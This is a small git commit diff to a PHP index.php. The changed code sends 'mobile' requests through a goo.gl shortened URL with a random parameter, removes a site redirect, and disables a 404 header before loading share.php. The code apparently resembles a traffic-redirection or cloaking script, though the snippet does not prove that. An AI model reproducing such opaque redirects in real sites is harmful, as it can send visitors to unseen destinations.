3741a3f1e82363ec90820da81ee8664202621eaf
Kadir Gün <kadir@kadirgun.com>
2017-03-24 15:37:58 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -98,13 +98,10 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
   if($action == 'mobile'){
     header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
-  }else if($action == 'site'){
-    $site = getSite();
-    header("Location: http://$site/$id.html");
   }else{
     @ob_end_clean();
     @ob_end_flush();
-    header("HTTP/1.1 404 Not Found");
+    //header("HTTP/1.1 404 Not Found");
     require_once('share.php');
   }
 ?>
